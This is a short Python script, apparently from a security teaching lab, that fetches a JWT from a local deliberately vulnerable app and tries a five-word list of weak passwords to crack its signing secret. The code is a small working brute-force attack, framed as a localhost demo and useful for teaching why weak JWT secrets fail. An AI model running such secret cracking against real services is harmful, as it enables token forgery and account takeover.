"""Educational weak-secret brute force demo against local vulnerable app only."""

from __future__ import annotations

import requests  # Import requests for local vulnerable endpoint interaction.
from jose import JWTError  # Import JWTError for decode failure handling.

from src.jwt_utils import decode_with_secret  # Import decode helper for secret candidate testing.

VULN_BASE = "http://localhost:8001"  # Define vulnerable app base URL for local demo.
WORDLIST = ["123456", "admin", "letmein", "password", "password123"]  # Define small educational wordlist with intentionally weak candidate.


def run_attack() -> dict:
    """Request weak token and brute-force secret from small wordlist."""

    token = requests.get(f"{VULN_BASE}/vuln/weak/issue", timeout=8).json()["token"]  # Request weak-secret token from vulnerable app.
    for secret in WORDLIST:  # Iterate through candidate secrets in educational wordlist.
        try:  # Attempt token decode with current candidate secret.
            claims = decode_with_secret(token, secret)  # Decode token using current secret guess.
            return {"cracked_secret": secret, "claims": claims}  # Return successful secret and decoded claims.
        except JWTError:  # Continue searching when decode fails.
            continue  # Move to next secret candidate.
    return {"cracked_secret": None, "claims": None}  # Return no-hit result when wordlist fails.


if __name__ == "__main__":
    print(run_attack())  # Execute and print brute-force demo result.
